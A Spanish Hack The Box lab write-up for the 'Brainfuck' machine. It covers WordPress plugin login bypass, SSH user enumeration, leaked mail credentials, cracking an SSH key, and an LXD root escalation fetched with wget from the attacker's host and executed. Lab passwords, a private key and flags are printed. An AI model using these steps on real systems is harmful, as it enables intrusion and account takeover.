---
layout: post
title: BrainFuck
date: 2023-01-21
description: 
img:
fig-caption:
tags: [eWPT, OSCP (Escalada)]
---
___

<center><img src="/writeups/assets/img/Brainfuck-htb/Brainfuck_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inspección de Certificado TLS

* Enumeración de WordPress

* Abuso de plugin de WordPress

* Information Leakage

* Enumeración SMTP

* Reto criptográfico 1

* Abuso del grupo LXD (Escalada de Privilegios no intencionada)

* Reto criptográfico 2 (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.10.17 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 15:58 GMT
Initiating SYN Stealth Scan at 15:58
Scanning 10.10.10.17 [65535 ports]
Discovered open port 25/tcp on 10.10.10.17
Discovered open port 110/tcp on 10.10.10.17
Discovered open port 22/tcp on 10.10.10.17
Discovered open port 443/tcp on 10.10.10.17
Discovered open port 143/tcp on 10.10.10.17
Completed SYN Stealth Scan at 15:58, 27.00s elapsed (65535 total ports)
Nmap scan report for 10.10.10.17
Host is up, received user-set (0.15s latency).
Scanned at 2023-01-21 15:58:01 GMT for 27s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
25/tcp  open  smtp    syn-ack ttl 63
110/tcp open  pop3    syn-ack ttl 63
143/tcp open  imap    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.08 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 29 (1.276KB)
```

### Escaneo de Servicios y Versiones de cada puerto

```null
nmap -sCV -p22,25,110,143,443 10.10.10.17 -Pn -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-21 15:59 GMT
Nmap scan report for 10.10.10.17
Host is up (0.081s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: USER SASL(PLAIN) RESP-CODES PIPELINING AUTH-RESP-CODE UIDL CAPA TOP
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: IDLE SASL-IR more listed LOGIN-REFERRALS OK capabilities post-login Pre-login have IMAP4rev1 AUTH=PLAINA0001 ID LITERAL+ ENABLE
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-title: Welcome to nginx!
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.51 seconds

```

En base a los CN, añado el dominio y los subdomios al /etc/hosts

```null
echo '10.10.10.17 brainfuck.htb sup3rs3cr3t.brainfuck.htb wwww.brainfuck.htb' >> /etc/hosts
```

## Puerto 443 (HTTPS)

Con whatweb, analizo los servicios que corren bajo el servidor web

```null
whatweb https://10.10.10.17
https://10.10.10.17 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.17], Title[Welcome to nginx!], nginx[1.10.0]
```

Abriendo el certificado SSL, se puede ver un usuario

```null
openssl s_client -connect 10.10.10.17:443 2>/dev/null | grep CN
 0 s:C = GR, ST = Attica, L = Athens, O = Brainfuck Ltd., OU = IT, CN = brainfuck.htb, emailAddress = orestis@brainfuck.htb
```

Para obtener un poco más de información, puedo analizar el certficado con sslscan

```null
sslscan https://10.10.10.17
Version: 2.0.15-static
OpenSSL 1.1.1q-dev  xx XXX xxxx

Connected to 10.10.10.17

Testing SSL server 10.10.10.17 on port 443 using SNI name 10.10.10.17

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     disabled
TLSv1.0   enabled
TLSv1.1   enabled
TLSv1.2   enabled
TLSv1.3   disabled

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLSv1.2 not vulnerable to heartbleed
TLSv1.1 not vulnerable to heartbleed
TLSv1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-GCM-SHA384     DHE 1024 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA256         DHE 1024 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384            
Accepted  TLSv1.2  256 bits  AES256-SHA256                
Accepted  TLSv1.2  256 bits  AES256-SHA                   
Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-GCM-SHA256     DHE 1024 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA256         DHE 1024 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256            
Accepted  TLSv1.2  128 bits  AES128-SHA256                
Accepted  TLSv1.2  128 bits  AES128-SHA                   
Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA              
Preferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
Accepted  TLSv1.1  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
Accepted  TLSv1.1  256 bits  AES256-SHA                   
Accepted  TLSv1.1  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
Accepted  TLSv1.1  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
Accepted  TLSv1.1  128 bits  AES128-SHA                   
Accepted  TLSv1.1  128 bits  CAMELLIA128-SHA              
Preferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
Accepted  TLSv1.0  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
Accepted  TLSv1.0  256 bits  AES256-SHA                   
Accepted  TLSv1.0  256 bits  CAMELLIA256-SHA              
Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
Accepted  TLSv1.0  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
Accepted  TLSv1.0  128 bits  AES128-SHA                   
Accepted  TLSv1.0  128 bits  CAMELLIA128-SHA              

  Server Key Exchange Group(s):
TLSv1.2  128 bits  secp256r1 (NIST P-256)

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    3072

Subject:  brainfuck.htb
Altnames: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
Issuer:   brainfuck.htb

Not valid before: Apr 13 11:19:29 2017 GMT
Not valid after:  Apr 11 11:19:29 2027 GMT
```

Como la versión de SSH es inferior a la 7.7, se puede tratar de validar el anterior usuario para ver si existe en el sistema

```null
searchsploit -m linux/remote/45939.py
  Exploit: OpenSSH < 7.7 - User Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
    Codes: CVE-2018-15473
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/rubbx/Desktop/HTB/Machines/BrainFuck/45939.py

mv 45939.py sshuserenum.py

python2 sshuserenum.py 10.10.10.17 orestis 2>/dev/null
[+] orestis is a valid username

python2 sshuserenum.py 10.10.10.17 orestiiis 2>/dev/null
[-] orestiiis is an invalid username
```

Por tanto, orestis es un usuario válido

Con whatweb, vuelvo a realizar un escaneo, pero esta vez a través del dominio

```null
whatweb https://brainfuck.htb
https://brainfuck.htb [200 OK] Bootstrap[4.7.3], Country[RESERVED][ZZ], Email[ajax-loader@2x.gif,orestis@brainfuck.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.17], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], Modernizr, PoweredBy[WordPress,], Script[text/javascript], Title[Brainfuck Ltd. &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3], nginx[1.10.0]
```

El contenido de la página principal es el siguiente:

<img src="/writeups/assets/img/Brainfuck-htb/1.png" alt="">

Como el nombre de una sección hace referencia a tickets, busco en exploit database por algun plugin de WordPress que los contemple

```null
searchsploit wordpress ticket
searchsploit -x php/webapps/40939.txt
```

Entre todos, destaca uno con una SQLi y otro con una escalada de privilegios

En las primeras líneas del exploit, se puede ver una ruta que indica el nombre que tiene cuando se instala

```null
# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 <E2><80><93> WordPress Plugin <E2><80><93> Sql Injection
# Exploit Author: Lenon Leite
# Vendor Homepage: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
```

El directorio de plugins de la web brainfuck.htb tiene capacidad de directory listing, por lo que puedo ver las versiones y lo que hay instalado

<img src="/writeups/assets/img/Brainfuck-htb/2.png" alt="">

En las primeras líneas del README.txt, aparece la versión que coincide con el exploit examinado anteriormente

```null
=== WP Support Plus Responsive Ticket System ===
Contributors: pradeepmakone07
License: GPL v3
Tags: ticket,support,helpdesk,crm,responsive,chat,skype,email pipe,contact,faq,woocommerce
Requires at least: 4.0
Tested up to: 4.7
Stable tag: 7.1.3
```

Examino el exploit de escalada de privilegios

```null
searchploit -x php/webapps/41006.txt
```

Hay una prueba de concepto que explica como iniciar sesión como cualquier usuario sin conocer la contraseña

```null
1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

Guardo el formulario en un fichero index.html para hostearlo (introduciendo el dominio brainfuck.htb en el action) y abrirlo en el navegador web

Creo un servicio http con python

```null
python3 -m http.server 80
```

Al abrir el formulario, aparece lo siguiente:

<img src="/writeups/assets/img/Brainfuck-htb/3.png" alt="">

En la página principal aparecía el usuario admin, así que suponiendo que existe, introduzco ese usuario y envío

Me redirige a https://brainfuck.htb/wp-admin/admin-ajax.php

Suponiendo que estoy loggeado, me dirijo a wp-admin y no me debería de pedir contraseña, ya que estoy arrastrando una cookie de sesión

<img src="/writeups/assets/img/Brainfuck-htb/4.png" alt="">

Podría tratar de inyectar codigo PHP en alguna plantilla, pero no tengo capacidad de escritura en ninguna

<img src="/writeups/assets/img/Brainfuck-htb/5.png" alt="">

Como así no puedo ganar acceso, tengo que encontrar una alternativa

Tengo acceso a la configuración de los plugins

<img src="/writeups/assets/img/Brainfuck-htb/6.png" alt="">

Uno de ellos tiene una contraseña en texto claro para conectarse por SMTP

<img src="/writeups/assets/img/Brainfuck-htb/7.png" alt="">

Para poder verla, basta con inspeccionar el elemento y cambiar el tipo por otro que no sea password

<img src="/writeups/assets/img/Brainfuck-htb/8.png" alt="">

<img src="/writeups/assets/img/Brainfuck-htb/9.png" alt="">

En la máquina estaba abierto el puerto 25 (SMTP) y el 110 (POP3) por lo que me puedo conectar con netcat proporcionando esa contraseña y listar correos

```null
nc 10.10.10.17 110
+OK Dovecot ready.
USER orestis
+OK
PASS kHGuERB29DNiNE
+OK Logged in.
LIST
+OK 2 messages:
1 977
2 514
.
RETR 1
+OK 977 octets
Return-Path: <www-data@brainfuck.htb>
X-Original-To: orestis@brainfuck.htb
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 33)
	id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: New WordPress Site
X-PHP-Originating-Script: 33:class-phpmailer.php
Date: Mon, 17 Apr 2017 17:15:40 +0000
From: WordPress <wordpress@brainfuck.htb>
Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8

Your new WordPress site has been successfully set up at:

https://brainfuck.htb

You can log in to the administrator account with the following information:

Username: admin
Password: The password you chose during the install.
Log in here: https://brainfuck.htb/wp-login.php

We hope you enjoy your new site. Thanks!

--The WordPress Team
https://wordpress.org/

RETR 2
+OK 514 octets
Return-Path: <root@brainfuck.htb>
X-Original-To: orestis
Delivered-To: orestis@brainfuck.htb
Received: by brainfuck (Postfix, from userid 0)
	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
To: orestis@brainfuck.htb
Subject: Forum Access Details
Message-Id: <20170429101206.4227420AEB@brainfuck>
Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
From: root@brainfuck.htb (root)

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```
En el segundo correo se puede ver una contraseña nueva

Volviendo atras, había dejado un subdominio sin abrir, y como habla de un foro secreto, tiene sentido que sea la para esa web

Al abrirlo aparece lo siguiente:

<img src="/writeups/assets/img/Brainfuck-htb/10.png" alt="">

Si me autentico puedo acceder a un apartado de mi perfil

Dentro están almacenadas varias conversaciones cifradas (CTF sin sentido)

<img src="/writeups/assets/img/Brainfuck-htb/12.png" alt="">

En [este artículo](https://www.theguardian.com/childrens-books-site/2015/sep/10/top-10-codes-keys-and-ciphers) se pueden ver los tipos de cifrados más comunes

En concreto, el que se está empleando es The Vigenère

Existen páginas web que tratan de descifrarlo, pero necesito una clave para hacerlo, aunque en caso de conocer el texto cifrado y el texto en claro, se puede tratar de obtener

En todos los comentarios, de orestis, se está empleando una firma, por lo que como en una conversación está cifrada y en otra no, puedo obtener la key

<img src="/writeups/assets/img/Brainfuck-htb/13.png" alt="">

<img src="/writeups/assets/img/Brainfuck-htb/14.png" alt="">

Desde decode.fr, calculo la clave introduciendo la frase encriptada y en claro

<img src="/writeups/assets/img/Brainfuck-htb/15.png" alt="">

Teniendo la clave (fuckmybrain), puede descifrar el resto de mensajes

En uno de ellos hay un dirección url que aloja una clave privada

<img src="/writeups/assets/img/Brainfuck-htb/16.png" alt="">

Tengo la id_rsa, pero está protegida por contraseña

```null
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```

Creo un hash para tratar de romperlo con john

```null
ssh2john id_rsa > hash
```

Aplico fuerza bruta

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)     
1g 0:00:00:03 DONE (2023-01-21 17:35) 0.2881g/s 3590Kp/s 3590Kc/s 3590KC/s 3prash0..3pornuthin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Teniendo la contraseña, me puedo conectar a la máquina víctima proporcionando la id_rsa, el usuario orestis y la contraseña de la clave privada

```null
ssh -i id_rsa orestis@10.10.10.17
The authenticity of host '10.10.10.17 (10.10.10.17)' can't be established.
ED25519 key fingerprint is SHA256:R2LI9xfR5z8gb7vJn7TAyhLI9RT5GEVp76CK9aoKnM8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.17' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


You have mail.
Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
orestis@brainfuck:~$
```

Puedo visualizar la primera flag

```null
orestis@brainfuck:~$ cat user.txt 
2c11cfbc5b959f73ac15a3310bd097c9
```

# Escalada (No intencionada)

Mirando los grupos a los que pertenece el usuario orestis, veo que estoy en LXD

Puedo tratar de crear una montura dentro de un contenedor que traslade todos los archivos desde la raíz del sistema base, de forma que como dentro del contenedor me puedo conectar como root, también podré acceder a todos los recursos

```null
searchsploit -m linux/local/46978.sh
mv 46978.sh lxd_exploit.sh
```

En el exploit proporcionan la forma de descargar una imagen alpine para subirla a la máquina victima

```null
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
mv alpine-v3.17-x86_64-20230121_1747.tar.gz alpine.tar.gz
```

Comparto un servicio http con python para transferirla

```null
python3 -m http.server 80
```

Desde la máquina víctima descargo el exploit y la imagen

```null
wget http://10.10.16.6/lxd_exploit.sh
wget http://10.10.16.6/alpine.tar.gz
```

```null
orestis@brainfuck:/tmp$ chmod +x lxd_exploit.sh 
orestis@brainfuck:/tmp$ ./lxd_exploit.sh -f alpine.tar.gz 
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: 9f5a024c81f6453304b0a586b2542e87408f1ee0ff0eeb48de20de02c9d28310
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | 9f5a024c81f6 | no     | alpine v3.17 (20230121_17:47) | x86_64 | 3.59MB | Jan 21, 2023 at 5:53pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # whoami
root
~ # 
~ # cd /mnt/root
/mnt/root # cd root
/mnt/root/root # cd root
cat root.txt
6efc1a5dbb8904751ce6566a305bb8ef
```

# Escalada

En el directorio personal de orestis hay tres archivos peculiares


```null
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

El script está abriendo la segunda flag para encriptarla y depositarla en el fichero output.txt

Por como se están llamando a las variables ('p', 'q', 'n', 'e') tiene pinta de que se está aplicando encriptación RSA.

En el fichero debug.txt se encuentran los valores de 'p', 'q', y 'e', siguiendo el orden del script de python

En [este post](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e) comparten un script en python que se encarga de desencriptar el mensaje pasándole los valores 'p', 'q', 'e' y la data encriptada.

El script quedaría de la siguiente forma:

```null
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

```null
python3 decrypt_rsa.py
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
```

El resultado está en decimal. Para convertirlo a ASCII:

```null
python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
>>> bytes.fromhex(f"{pt:x}").decode()
'6efc1a5dbb8904751ce6566a305bb8ef'
>>> 
```